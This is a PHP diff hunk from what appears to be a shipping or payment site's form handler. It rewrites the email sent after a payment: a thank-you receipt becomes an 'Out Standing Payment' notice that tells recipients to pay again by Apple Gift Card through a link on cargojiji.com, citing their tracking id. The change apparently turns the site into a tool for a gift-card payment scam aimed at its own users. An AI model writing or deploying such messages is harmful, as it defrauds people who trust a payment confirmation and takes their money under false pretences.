@@ -76,8 +76,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['submit'])) {
         
         // Send email to the user
         $to = $email;
-        $subject = "Payment Received";
-        $message = "Thank you for your payment. Your payment of $" . $amount . " has been received.";
+        $subject = "Out Standing Payment";
+        $message = "you have an out standing payment of $" . $amount . " make payment by Apple Gift Card using link: http://cargojiji.com/makepayment.php  using your tacking id".$trackid .".Your transaction is pending we get back to you";
         $headers = "From: contact@cargojiji.com"; // Replace with your email address
         
         // Send email
